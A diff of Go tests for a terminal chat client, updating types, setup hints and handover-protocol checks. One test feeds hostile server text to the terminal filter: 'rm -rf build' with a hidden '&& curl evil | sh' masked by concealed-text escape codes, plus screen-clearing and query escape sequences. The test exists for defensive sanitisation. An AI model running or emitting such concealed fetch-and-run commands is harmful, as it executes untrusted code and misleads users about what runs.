@@ -16,7 +16,7 @@ import (
 	"connectrpc.com/connect"
 
 	"github.com/atemaguer/supertag/apps/tui/client"
-	"github.com/atemaguer/supertag/packages/operator-api/go/operatorv1"
+	"github.com/atemaguer/supertag/apps/tui/views"
 )
 
 func testModel(t *testing.T, fake *fakeControlPlane) model {
@@ -34,8 +34,8 @@ func testModel(t *testing.T, fake *fakeControlPlane) model {
 	return update(t, m, tea.WindowSizeMsg{Width: 100, Height: 30})
 }
 
-func tags(names ...string) func() ([]*operatorv1.Tag, error) {
-	return func() ([]*operatorv1.Tag, error) { return tagList(names...), nil }
+func tags(names ...string) func() ([]*views.Tag, error) {
+	return func() ([]*views.Tag, error) { return tagList(names...), nil }
 }
 
 func update(t *testing.T, m model, msg tea.Msg) model {
@@ -82,114 +82,8 @@ func key(code rune) tea.KeyPressMsg { return tea.KeyPressMsg{Code: code} }
 
 func screen(m model) string { return ansi.Strip(m.View().Content) }
 
-func TestSendStreamsTheReplyAndWork(t *testing.T) {
-	fake := &fakeControlPlane{
-		tags: tags("lead", "builder"),
-		send: func(req *operatorv1.SendMessageRequest) *operatorv1.Message {
-			return waitingMessage("t1", req.GetText())
-		},
-		follow: func(_ context.Context, _ *operatorv1.FollowMessageRequest, stream *connect.ServerStream[operatorv1.FollowEvent]) error {
-			for _, event := range []*operatorv1.FollowEvent{
-				followEvent(1, command("", "rg discount")),
-				followEvent(2, &operatorv1.Finish{Reply: finalReply("**Started** the fix."), Message: &operatorv1.Message{TaskId: "t1",
-					WorkSessions: []*operatorv1.WorkSession{workSession("s1", "Validate percent", "w1", "")}}}),
-				followEvent(3, &operatorv1.WorkSessionChanged{WorkSession: workSession("s1", "Validate percent", "w1", "Fixed it.")}),
-				followEvent(4, &operatorv1.FollowEnd{Message: &operatorv1.Message{TaskId: "t1"}}),
-			} {
-				if err := stream.Send(event); err != nil {
-					return err
-				}
-			}
-			return nil
-		},
-	}
-	m := start(t, testModel(t, fake))
-	if !m.connected || m.selectedTag() != "lead" {
-		t.Fatalf("connected=%v selected=%q status=%q", m.connected, m.selectedTag(), m.status)
-	}
-	m.input.SetValue("apply_discount accepts 150%")
-	next, cmd := m.Update(key(tea.KeyEnter))
-	m = run(t, next.(model), cmd)
-	got := screen(m)
-	for _, want := range []string{"laptop", "connected", "lead · default", "you", "apply_discount accepts 150%",
-		"· running: rg discount", "Started the fix.", "· working: Validate percent", "· done: Validate percent", "Fixed it."} {
-		if !strings.Contains(got, want) {
-			t.Errorf("screen lacks %q:\n%s", want, got)
-		}
-	}
-	if m.input.Value() != "" {
-		t.Errorf("input not cleared: %q", m.input.Value())
-	}
-	if len(fake.sent) != 1 || fake.sent[0].GetTag() != "lead" || fake.sent[0].GetConversation() != "default" || fake.sent[0].GetIdempotencyKey() == "" {
-		t.Errorf("sent = %v", fake.sent)
-	}
-}
-
-func TestSelectingATagShowsItsHistory(t *testing.T) {
-	answered := &operatorv1.Message{TaskId: "t1", Text: "What changed?", Status: operatorv1.ReplyStatus_REPLY_STATUS_REPLIED,
-		Reply: finalReply("The **discount** rules."), WorkSessions: []*operatorv1.WorkSession{workSession("s1", "Audit", "w1", "Audited.")}}
-	working := &operatorv1.Message{TaskId: "t2", Text: "Now fix it", Status: operatorv1.ReplyStatus_REPLY_STATUS_REPLIED,
-		Reply: finalReply("Fixing."), WorkSessions: []*operatorv1.WorkSession{workSession("s2", "Fix", "w2", "")}}
-	var asked []string
-	fake := &fakeControlPlane{
-		tags: tags("lead", "builder"),
-		history: func(req *operatorv1.ListMessagesRequest) []*operatorv1.Message {
-			asked = append(asked, req.GetTag()+"/"+req.GetConversation())
-			if req.GetTag() != "lead" {
-				return nil
-			}
-			return []*operatorv1.Message{working, answered}
-		},
-		follow: func(_ context.Context, req *operatorv1.FollowMessageRequest, stream *connect.ServerStream[operatorv1.FollowEvent]) error {
-			if req.GetTaskId() != "t2" {
-				t.Errorf("followed %s; only the unsettled message needs following", req.GetTaskId())
-			}
-			for _, event := range []*operatorv1.FollowEvent{
-				followEvent(1, &operatorv1.Finish{Reply: finalReply("Fixing."), Message: working}),
-				followEvent(2, &operatorv1.WorkSessionChanged{WorkSession: workSession("s2", "Fix", "w2", "Fixed.")}),
-				followEvent(3, &operatorv1.FollowEnd{Message: working}),
-			} {
-				if err := stream.Send(event); err != nil {
-					return err
-				}
-			}
-			return nil
-		},
-	}
-	m := testModel(t, fake)
-	if _, cmd := m.Update(key(tea.KeyEnter)); cmd != nil {
-		t.Fatal("nothing to send before the Tags load")
-	}
-	m = start(t, m)
-	got := screen(m)
-	order := []string{"What changed?", "The discount rules.", "· working: Audit", "· done: Audit", "Audited.",
-		"Now fix it", "Fixing.", "· working: Fix", "· done: Fix", "Fixed."}
-	at := 0
-	for _, want := range order {
-		i := strings.Index(got[at:], want)
-		if i < 0 {
-			t.Fatalf("screen lacks %q after position %d:\n%s", want, at, got)
-		}
-		at += i + len(want)
-	}
-	if strings.Count(got, "Fixing.") != 1 || strings.Count(got, "· working: Fix") != 1 {
-		t.Fatalf("following the history repeated it:\n%s", got)
-	}
-	m = update(t, m, key(tea.KeyTab))
-	next, cmd := m.Update(key(tea.KeyDown))
-	m = run(t, next.(model), cmd)
-	if !strings.Contains(screen(m), "Say something to builder") {
-		t.Fatalf("builder's empty history:\n%s", screen(m))
-	}
-	next, cmd = m.Update(key(tea.KeyUp))
-	m = run(t, next.(model), cmd)
-	if strings.Join(asked, " ") != "lead/default builder/default" {
-		t.Fatalf("history loads = %v, want one per Tag", asked)
-	}
-}
-
 func TestErrorsShowInTheStatusBar(t *testing.T) {
-	fake := &fakeControlPlane{tags: func() ([]*operatorv1.Tag, error) {
+	fake := &fakeControlPlane{tags: func() ([]*views.Tag, error) {
 		return nil, connect.NewError(connect.CodeUnauthenticated, errors.New("The token is not valid"))
 	}}
 	m := start(t, testModel(t, fake))
@@ -213,7 +107,7 @@ func TestShowsSetupUntilATagExists(t *testing.T) {
 
 	m = start(t, m)
 	if got := screen(m); !strings.Contains(got, "Set up SuperTag") ||
-		!strings.Contains(got, "supertag init") || strings.Contains(got, conversationPlaceholder) {
+		!strings.Contains(got, "supertag tag put --help") || strings.Contains(got, conversationPlaceholder) {
 		t.Fatalf("screen without any Tags:\n%s", got)
 	}
 	m = update(t, m, tea.PasteMsg{Content: "Text entered before setup"})
@@ -230,63 +124,13 @@ func TestShowsSetupUntilATagExists(t *testing.T) {
 
 	fake.tags = tags()
 	m = run(t, m, m.reloadTags())
-	if got := screen(m); !strings.Contains(got, "supertag init") || m.inputShown() || m.input.Focused() {
+	if got := screen(m); !strings.Contains(got, "supertag tag put --help") || m.inputShown() || m.input.Focused() {
 		t.Fatalf("screen after the last Tag leaves:\n%s", got)
 	}
 	m = update(t, m, sentMsg{tag: "lead", conversation: "default", err: errors.New("Tag no longer exists")})
 	m = update(t, m, tea.WindowSizeMsg{Width: 100, Height: 30})
-	if got := screen(m); !strings.Contains(got, "Set up SuperTag") || !strings.Contains(got, "supertag init") {
+	if got := screen(m); !strings.Contains(got, "Set up SuperTag") || !strings.Contains(got, "supertag tag put --help") {
 		t.Fatalf("a late send error replaced setup guidance:\n%s", got)
-	}
-}
-
-func TestTheWatchStreamDrivesTheRail(t *testing.T) {
-	names := []string{"lead"}
-	open := 0
-	fake := &fakeControlPlane{
-		tags: func() ([]*operatorv1.Tag, error) { return tagList(names...), nil },
-		open: func() []*operatorv1.Conversation {
-			return []*operatorv1.Conversation{{Tag: "lead", Name: "default", OpenWorkSessionCount: int32(open)}, {Tag: "lead", Name: "other", OpenWorkSessionCount: 5}}
-		},
-	}
-	m := start(t, testModel(t, fake))
-	closed := make(chan client.WatchUpdate)
-	close(closed)
-	watch := func(m model, update client.WatchUpdate) model {
-		next, cmd := m.Update(watchMsg{update: update, updates: closed})
-		return run(t, next.(model), cmd)
-	}
-	m = watch(m, client.WatchUpdate{Kind: client.WatchLive})
-	reads := fake.reads()
-	m = update(t, m, pollMsg{})
-	if fake.reads() != reads || m.polling {
-		t.Fatal("a live watch stream must stop polling")
-	}
-
-	names = []string{"lead", "reviewer"}
-	m = watch(m, client.WatchUpdate{Kind: client.WatchChanged, Change: &operatorv1.WatchChange{Kind: operatorv1.WatchKind_WATCH_KIND_TAG, Tag: "reviewer"}})
-	if !strings.Contains(m.renderRail(10), "reviewer") {
-		t.Fatalf("a Tag change did not reread the Tags:\n%s", m.renderRail(10))
-	}
-	open = 2
-	m = watch(m, client.WatchUpdate{Kind: client.WatchChanged, Change: &operatorv1.WatchChange{Kind: operatorv1.WatchKind_WATCH_KIND_CONVERSATION_MESSAGE, Tag: "lead"}})
-	if rail := ansi.Strip(m.renderRail(10)); !strings.Contains(rail, "lead 2 open") || !strings.Contains(rail, "reviewer active") {
-		t.Fatalf("rail:\n%s", rail)
-	}
-
-	next, cmd := m.Update(watchMsg{update: client.WatchUpdate{Kind: client.WatchLost, Err: errors.New("gone")}, updates: closed})
-	m = next.(model)
-	if m.live || !m.polling || cmd == nil {
-		t.Fatal("a lost watch stream must start polling")
-	}
-	m = run(t, m, cmd)
-	if fake.reads() <= reads+1 {
-		t.Fatal("polling did not reread the Tags")
-	}
-	names = []string{"reviewer"}
-	m = watch(m, client.WatchUpdate{Kind: client.WatchResync})
-	if !m.live || m.selectedTag() != "reviewer" {
-		t.Fatalf("a resync must reread everything: live=%v selected=%q", m.live, m.selectedTag())
 	}
 }
 
@@ -323,7 +167,7 @@ func TestReadHandover(t *testing.T) {
 		t.Fatal(err)
 	}
 	go func() {
-		fmt.Fprintln(w, `{"contexts":[{"url":"http://127.0.0.1:7468","token":"st_x"},{"url":"https://cp.example.com","token":"st_z","name":"team"}],"current":1}`)
+		fmt.Fprintln(w, `{"contexts":[{"url":"http://127.0.0.1:7468","token":"st_x"},{"url":"https://cp.example.com","token":"st_z","name":"team"}],"current":1,"protocol":"runtime.v2"}`)
 		w.Close()
 	}()
 	h, err := readHandover(r)
@@ -342,7 +186,7 @@ func TestReadHandover(t *testing.T) {
 	}
 	parent, child := os.NewFile(uintptr(fds[0]), "parent"), os.NewFile(uintptr(fds[1]), "supertag-target")
 	go func() {
-		fmt.Fprintln(parent, `{"contexts":[{"url":"http://127.0.0.1:7468","token":"st_y"}],"current":0}`)
+		fmt.Fprintln(parent, `{"contexts":[{"url":"http://127.0.0.1:7468","token":"st_y"}],"current":0,"protocol":"runtime.v2"}`)
 		parent.Close()
 	}()
 	if h, err := readHandover(child); err != nil || h.Contexts[h.Current].Token != "st_y" {
@@ -356,6 +200,8 @@ func TestReadHandover(t *testing.T) {
 		`{"contexts":[{"url":"http://x","token":"t"}],"current":-1}`,
 		`{"contexts":[{"url":"http://x","token":"t"},{"url":"http://y"}],"current":0}`,
 		`{"protocol":"runtime.v3","contexts":[{"url":"https://gateway.test","token":"t"}],"current":0}`,
+		// A handover without a protocol came from a CLI without the runtime.v2 Control Plane.
+		`{"contexts":[{"url":"https://gateway.test","token":"t"}],"current":0}`,
 	} {
 		r, w, err := os.Pipe()
 		if err != nil {
@@ -417,7 +263,7 @@ func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
 		client.FollowEvent{Kind: client.EventActivity, Text: "· running: rm -rf build \x1b[8m&& curl evil | sh\x1b[28m"},
 		client.FollowEvent{Kind: client.EventWaiting, Text: "no host\x1b[2J"},
 		client.FollowEvent{Kind: client.EventApproval, Title: "Push\x1b[8m to main", Text: "Push?\x1bP+q\x1b\\"},
-		client.FollowEvent{Kind: client.EventReply, Reply: &operatorv1.Reply{Text: "done \x1b_Gf=100;AAAA\x1b\\"}},
+		client.FollowEvent{Kind: client.EventReply, Reply: &views.Reply{Text: "done \x1b_Gf=100;AAAA\x1b\\"}},
 		client.FollowEvent{Kind: client.EventTurnError, Text: "Tag lead could not answer: \x1b[2Jgone"},
 		client.FollowEvent{Kind: client.EventDelta, Text: "draft \x1bP1$r\x1b\\"},
 	)
@@ -440,7 +286,7 @@ func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
 func TestPastRepliesAreRenderedOncePerWidth(t *testing.T) {
 	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead", "builder")}))
 	for i := range 20 {
-		m = followed(t, m, client.FollowEvent{Kind: client.EventReply, Reply: &operatorv1.Reply{Text: fmt.Sprintf("**reply %d**", i)}})
+		m = followed(t, m, client.FollowEvent{Kind: client.EventReply, Reply: &views.Reply{Text: fmt.Sprintf("**reply %d**", i)}})
 	}
 	before := m.md.renders
 	for range 50 {
